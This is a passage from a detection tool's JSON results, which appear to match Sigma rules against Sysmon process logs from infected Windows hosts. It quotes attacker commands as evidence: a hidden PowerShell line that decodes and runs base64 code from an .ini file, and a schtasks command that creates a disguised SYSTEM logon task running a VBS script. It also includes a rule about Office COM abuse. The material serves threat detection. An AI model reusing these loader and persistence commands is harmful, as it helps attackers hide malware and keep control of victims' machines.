                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CDB-64AD-4206-000000004400}; ProcessId=6452; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CC6-64AD-3E06-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=5600; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsMalwareByteSDK /TR \"wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" /F; EventID=1; LogonGuid=C784477D-CFAC-648A-5D99-030000000000; LogonId=235869; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; UtcTime=1689099483; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9D1A-64AD-5806-000000004400}; ProcessId=5484; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9CE6-64AD-4906-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4236; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsMalwareByteSDK /TR \"wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" /F; EventID=1; LogonGuid=C784477D-CFAC-648A-8E99-030000000000; LogonId=235918; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; UtcTime=1689099546; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=478BEAEC1C3A9417272BC8964ADD1CEE,SHA256=9A121ACF7686D2883E524332111D5E4BCC0C1A8E81136486FBA4CA65CA614407,IMPHASH=918DBB01101BFA7F1042CCA9520D2A05; CurrentDirectory=C:\\Users\\Bruno\\Desktop\\; OriginalFileName=schtasks.exe; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; FileVersion=10.0.19041.906 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini))));; CommandLine=\"C:\\Windows\\system32\\schtasks.exe\" /Create /RU system /SC ONLOGON /TN Microsoft\\WindowsMalwareByteSDK /TR \"wscript C:\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs\" /F; EventID=1; ParentImage=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\schtasks.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "ffbbcedfb9a1fd41ebb288154c10cf5cf869eb25195708be30f8a9df74f411cc",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious New Instance Of An Office COM Object",
                                                                       "rule_description":  "Detects an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as \u0027Word.Application\u0027, \u0027Excel.Application\u0027, etc.\nThis can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)\n",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9CBE-64AD-3A06-000000004400}; ProcessId=4532; Product=Microsoft Office 2016; Description=Microsoft Word; Company=Microsoft Corporation; ParentProcessGuid={C784477D-CFA8-648A-1000-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=CE33FC3C687D3C01159A8CAEA7F5482E,SHA256=5D75D0EA8BBB5B652F7B72CF728C00322BD486D54A5C4978CEACDF70B4317EE6,IMPHASH=1B2B96B0763DACAFA277667CA093F96D; OriginalFileName=WinWord.exe; ParentImage=C:\\Windows\\System32\\svchost.exe; FileVersion=16.0.4266.1001; ParentProcessId=856; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE\" /Automation -Embedding; EventID=1; LogonGuid=C784477D-CFAC-648A-5D99-030000000000; LogonId=235869; Image=C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p; UtcTime=1689099454; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
